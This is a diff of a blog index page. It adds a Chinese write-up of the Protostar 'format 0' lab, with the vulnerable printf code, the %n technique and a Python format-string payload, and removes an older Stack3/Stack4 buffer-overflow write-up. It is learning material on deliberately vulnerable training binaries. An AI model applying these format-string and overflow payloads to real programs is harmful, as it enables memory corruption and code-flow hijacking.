@@ -1195,6 +1195,102 @@
 
 
   
+    <article id="post-Protostar-栈溢出系列学习-format 0/Protostar-栈溢出系列学习-format 0" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="2016/07/10/Protostar-栈溢出系列学习-format 0/Protostar-栈溢出系列学习-format 0/">Protostar-栈溢出系列学习-format 0</a>
+    </h1>
+  
+
+        
+        <a href="2016/07/10/Protostar-栈溢出系列学习-format 0/Protostar-栈溢出系列学习-format 0/" class="archive-article-date">
+  	<time datetime="2016-07-10T03:12:19.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-07-10</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="0x00-序"><a href="#0x00-序" class="headerlink" title="0x00 序"></a>0x00 序</h2><p>从现在开始我们先结束stack类型的漏洞，来学习一些format类型的漏洞，非常有趣。但也确实让我想了很久。</p>
+<h2 id="0x01-format-0"><a href="#0x01-format-0" class="headerlink" title="0x01 format 0"></a>0x01 format 0</h2><p>C语言代码</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">int</span> target;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">(<span class="keyword">char</span> *<span class="built_in">string</span>)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="built_in">printf</span>(<span class="built_in">string</span>);</div><div class="line">  </div><div class="line">  <span class="keyword">if</span>(target) &#123;</div><div class="line">      <span class="built_in">printf</span>(<span class="string">"you have modified the target :)\n"</span>);</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></div><div class="line">&#123;</div><div class="line">  vuln(argv[<span class="number">1</span>]);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h2 id="0x02-疑惑-amp-分析-amp-思考"><a href="#0x02-疑惑-amp-分析-amp-思考" class="headerlink" title="0x02 疑惑&amp;分析&amp;思考"></a>0x02 疑惑&amp;分析&amp;思考</h2><p>拿到这题，我和大家一样，哪里有可以利用的漏洞？？？就将一个命令行参数打印出来，很明显是让我们修改全局变量<strong>target</strong>的值。但好像除了<code>printf()</code>函数，就没有其他可疑的地方了。what fuck？ 一个<code>printf()</code>函数怎么会有漏洞？</p>
+<p>但仔细观察可以发现这次<code>printf</code>的用法有点奇怪，直接打印一个字符串地址，很少会这样用，会不会就是这里？？？</p>
+<h2 id="0x03-测试"><a href="#0x03-测试" class="headerlink" title="0x03 测试"></a>0x03 测试</h2><p>其他不说，先运行下程序试试<br><img src="/NULL-ME/NULL-ME.github.io.git/2016/07/10/Protostar-栈溢出系列学习-format 0/Protostar-栈溢出系列学习-format 0/king/4chendyBlog/paper/stackBufferOverflow/Protostar-栈溢出系列学习-format/ 0/0-1.png" alt="0-1"><br>再试着输入格式字符试试<br><img src="/NULL-ME/NULL-ME.github.io.git/2016/07/10/Protostar-栈溢出系列学习-format 0/Protostar-栈溢出系列学习-format 0/king/4chendyBlog/paper/stackBufferOverflow/Protostar-栈溢出系列学习-format/ 0/0-2.png" alt="0-2"><br>很奇怪，我们貌似得到一些栈中的值，再多打印一些试试<br><img src="/NULL-ME/NULL-ME.github.io.git/2016/07/10/Protostar-栈溢出系列学习-format 0/Protostar-栈溢出系列学习-format 0/king/4chendyBlog/paper/stackBufferOverflow/Protostar-栈溢出系列学习-format/ 0/0-3.png" alt="0-3"><br>可以看到后面打印出来了%x本身&lt;—<code>20782520</code>，通过linux stack layout可得知后面的确保存着参数字符串</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line">local <span class="keyword">variables</span> of <span class="comment">main</span></div><div class="line">saved <span class="comment">registers of main</span></div><div class="line">return <span class="comment">address of main</span></div><div class="line">argc</div><div class="line">argv</div><div class="line">envp</div><div class="line">stack <span class="comment">from startup code</span></div><div class="line">argc</div><div class="line">argv <span class="comment">pointers</span></div><div class="line">NULL <span class="comment">that ends argv[]</span></div><div class="line">environment <span class="comment">pointers</span></div><div class="line">NULL <span class="comment">that ends envp[]</span></div><div class="line">ELF <span class="comment">Auxiliary Table</span></div><div class="line">argv <span class="comment">strings              &lt;--------focus here</span></div><div class="line">environment <span class="comment">strings</span></div><div class="line">program <span class="comment">name</span></div><div class="line">NULL</div></pre></td></tr></table></figure>
+<h2 id="0x04-你不知道的printf"><a href="#0x04-你不知道的printf" class="headerlink" title="0x04 你不知道的printf"></a>0x04 你不知道的printf</h2><p>虽然我们可以通过上面的方法查看栈内容，即泄漏地址等。但如何才能改变target值呢？</p>
+<p>关注printf函数，有这么一段话：</p>
+<ul>
+<li>Code  such  as  printf(foo);  often indicates a bug, since foo may contain a % character.  If foo comes from untrusted user input, it may contain %n,causing the printf() call to write to memory and creating a security hole.</li>
+</ul>
+<p>简单就是说%n可以写入一个内存地址，其值为前面的字符数</p>
+<ul>
+<li>[n]The number of characters written so far is stored into the integer indicated by the int * (or variant) pointer argument.  No argument is con‐verted.</li>
+</ul>
+<p>看个例子<br><img src="/NULL-ME/NULL-ME.github.io.git/2016/07/10/Protostar-栈溢出系列学习-format 0/Protostar-栈溢出系列学习-format 0/king/4chendyBlog/paper/stackBufferOverflow/Protostar-栈溢出系列学习-format/ 0/0-4.png" alt="0-4"><br>这样的话就可以满足写入的问题了，现在的问题就是写入哪里，怎么写了</p>
+<h2 id="0x05-hack"><a href="#0x05-hack" class="headerlink" title="0x05 hack"></a>0x05 hack</h2><p>先利用<code>objdump -t</code>找到<code>target</code>的地址<br><img src="/NULL-ME/NULL-ME.github.io.git/2016/07/10/Protostar-栈溢出系列学习-format 0/Protostar-栈溢出系列学习-format 0/king/4chendyBlog/paper/stackBufferOverflow/Protostar-栈溢出系列学习-format/ 0/0-5.png" alt="0-5"><br>利用一句话Python反复测试</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/opt/protostar/bin/format<span class="number">1</span>  <span class="string">"`python -c 'print "</span>A<span class="string">"*4 + "</span>\<span class="keyword">x</span><span class="number">38</span>\<span class="keyword">x</span><span class="number">96</span>\<span class="keyword">x</span><span class="number">04</span>\<span class="keyword">x</span><span class="number">08</span><span class="string">" + "</span>BBB<span class="string">"+"</span><span class="symbol">%x</span> <span class="string">"*135"</span>'`<span class="string">"</span></div></pre></td></tr></table></figure>
+<p>调整%x的个数，使其target地址为最后一个<br><img src="/NULL-ME/NULL-ME.github.io.git/2016/07/10/Protostar-栈溢出系列学习-format 0/Protostar-栈溢出系列学习-format 0/king/4chendyBlog/paper/stackBufferOverflow/Protostar-栈溢出系列学习-format/ 0/0-6.png" alt="0-6"><br>然后将最后一个%x改为%n</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/opt/protostar/bin/format<span class="number">1</span>  <span class="string">"`python -c 'print "</span>A<span class="string">"*4 + "</span>\<span class="keyword">x</span><span class="number">38</span>\<span class="keyword">x</span><span class="number">96</span>\<span class="keyword">x</span><span class="number">04</span>\<span class="keyword">x</span><span class="number">08</span><span class="string">" + "</span>BBB<span class="string">"+"</span><span class="symbol">%x</span> <span class="string">"*134+"</span><span class="symbol">%n</span> <span class="string">"'`"</span></div></pre></td></tr></table></figure>
+<p>run!<br><img src="/NULL-ME/NULL-ME.github.io.git/2016/07/10/Protostar-栈溢出系列学习-format 0/Protostar-栈溢出系列学习-format 0/king/4chendyBlog/paper/stackBufferOverflow/Protostar-栈溢出系列学习-format/ 0/0-7.png" alt="0-7"><br><strong>成功修改target值!</strong></p>
+<h2 id="0x06-一点感悟"><a href="#0x06-一点感悟" class="headerlink" title="0x06 一点感悟"></a>0x06 一点感悟</h2><p>总的来说，自己受到了一点震感。So amazing！没想到一个printf使用不当就可能造成这么严重的漏洞。继续学习吧！</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Linux</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">Protostar</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">printf</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">format</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="2016/07/10/Protostar-栈溢出系列学习-format 0/Protostar-栈溢出系列学习-format 0/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
     <article id="post-Protostar-栈溢出系列学习-Stack 2/Protostar-栈溢出系列学习-Stack 2" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1279,108 +1375,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="2016/06/15/Protostar-栈溢出系列学习-Stack 2/Protostar-栈溢出系列学习-Stack 2/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-  
-    <article id="post-Protostar-栈溢出系列学习-Stack 1/Protostar-栈溢出系列学习-Stack 0" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="2016/04/15/Protostar-栈溢出系列学习-Stack 1/Protostar-栈溢出系列学习-Stack 0/">Protostar-栈溢出系列学习-Stack 1</a>
-    </h1>
-  
-
-        
-        <a href="2016/04/15/Protostar-栈溢出系列学习-Stack 1/Protostar-栈溢出系列学习-Stack 0/" class="archive-article-date">
-  	<time datetime="2016-04-15T03:12:19.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-04-15</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="0x00-序"><a href="#0x00-序" class="headerlink" title="0x00 序"></a>0x00 序</h2><p>接着之前的系列，下面研究两种控制eip的方式</p>
-<h2 id="0x01-通过覆盖栈中的函数指针控制eip"><a href="#0x01-通过覆盖栈中的函数指针控制eip" class="headerlink" title="0x01 通过覆盖栈中的函数指针控制eip"></a>0x01 通过覆盖栈中的函数指针控制eip</h2><p>Stack3 looks at environment variables, and how they can be set, and overwriting function pointers stored on the stack (as a prelude to overwriting the saved EIP)</p>
-<p>Hints:<br>both gdb and objdump is your friend you determining where the win() function lies in memory.</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">win</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"code flow successfully changed\n"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="function"><span class="keyword">volatile</span> <span class="title">int</span> <span class="params">(*fp)</span><span class="params">()</span></span>;</div><div class="line">  <span class="keyword">char</span> buffer[<span class="number">64</span>];</div><div class="line"></div><div class="line">  fp = <span class="number">0</span>;</div><div class="line"></div><div class="line">  gets(buffer);</div><div class="line"></div><div class="line">  <span class="keyword">if</span>(fp) &#123;</div><div class="line">      <span class="built_in">printf</span>(<span class="string">"calling function pointer, jumping to 0x%08x\n"</span>, fp);</div><div class="line">      fp();</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<ul>
-<li><p>在main函数下断点，分析可知，1处为fp的地址，2处为fp()的调用，我们需要覆盖掉esp+0x5c处所存的函数指针值，使其跳转到win()函数<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%201/1-0.png?raw=true" alt="1-0"></p>
-</li>
-<li><p>利用Python编写exp测试脚本，可以发现QQQQ覆盖了函数指针<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%201/1-1.png?raw=true" alt="1-1"><br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%201/1-2.png?raw=true" alt="1-2"><br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%201/1-3.png?raw=true" alt="1-3"><br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%201/1-4.png?raw=true" alt="1-4"></p>
-</li>
-</ul>
-<ul>
-<li>重新编写exp,将QQQQ改为win()函数的地址，即可实现自定义调用，控制eip</li>
-</ul>
-<p><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%201/1-5.png?raw=true" alt="1-5"><br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%201/1-6.png?raw=true" alt="1-6"></p>
-<p><strong>成功执行win()函数</strong></p>
-<p><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%201/1-7.png?raw=true" alt="1-7"></p>
-<h2 id="0x02-通过ret指令控制eip"><a href="#0x02-通过ret指令控制eip" class="headerlink" title="0x02 通过ret指令控制eip"></a>0x02 通过ret指令控制eip</h2><p>Stack4 takes a look at overwriting saved EIP and standard buffer overflows.</p>
-<p>This level is at /opt/protostar/bin/stack4</p>
-<p>Hints:<br>A variety of introductory papers into buffer overflows may help.<br>gdb lets you do “run &lt; input”<br>EIP is not directly after the end of buffer, compiler padding can also increase the size.</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">win</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"code flow successfully changed\n"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">char</span> buffer[<span class="number">64</span>];</div><div class="line"></div><div class="line">  gets(buffer);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<ul>
-<li><p>先分析一下，可以发现这个程序很简单，看上去没有可以直接控制eip的方法，但函数的调用过程在结束的时候会将保存的返回地址存在栈中，ret指令的时候会将传给eip。所以我们可以覆盖对应的返回地址值达到控制eip</p>
-<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">______________</div><div class="line">|<span class="string">            </span>|<span class="string">  &lt;---esp</span></div><div class="line">--------------</div><div class="line">|<span class="string">  局部变量1  </span>|</div><div class="line">--------------</div><div class="line">|<span class="string">  局部变量2  </span>|</div><div class="line">--------------</div><div class="line">|<span class="string"> ...        </span>|</div><div class="line">--------------</div><div class="line">|<span class="string">            </span>|<span class="string">  &lt;---new ebp</span></div><div class="line">--------------</div><div class="line">|<span class="string">   old ebp  </span>|</div><div class="line">--------------</div><div class="line">|<span class="string">  返回地址   </span>|<span class="string">  ret --------&gt; eip</span></div><div class="line">--------------</div></pre></td></tr></table></figure>
-</li>
-<li><p>和前面一样，这次我们之间利用Python编写exp测试脚本，可以发现SSSS覆盖了old ebp，TTTT覆盖了返回地址</p>
-</li>
-</ul>
-<p><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%201/1-9.png?raw=true" alt="1-9"><br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%201/1-8.png?raw=true" alt="1-8"><br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%201/1-10.png?raw=true" alt="1-10"></p>
-<ul>
-<li>我们查看win()的地址，重新编写对应exp，然后将TTTT改为其地址，成功达到目的。</li>
-</ul>
-<p><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%201/1-11.png?raw=true" alt="1-11"></p>
-<p><strong>成功执行win()函数</strong><br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%201/1-12.png?raw=true" alt="1-12"></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Linux</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">Protostar</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">栈溢出</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="2016/04/15/Protostar-栈溢出系列学习-Stack 1/Protostar-栈溢出系列学习-Stack 0/">展开全文 >></a>
         </p>
       
 
@@ -1491,6 +1485,18 @@
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">macOS内核</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">mach</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">vm</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">C++</a>
               </li>
              
@@ -1511,23 +1517,31 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">macOS内核</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">mach</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">vm</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">cve</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">IPC</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">printf</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">format</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">mach-o</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">dyld</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">stub</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1552,18 +1566,6 @@
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">iOS</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">mach-o</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">dyld</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">stub</a>
               </li>
              
               <li class="article-tag-list-item">
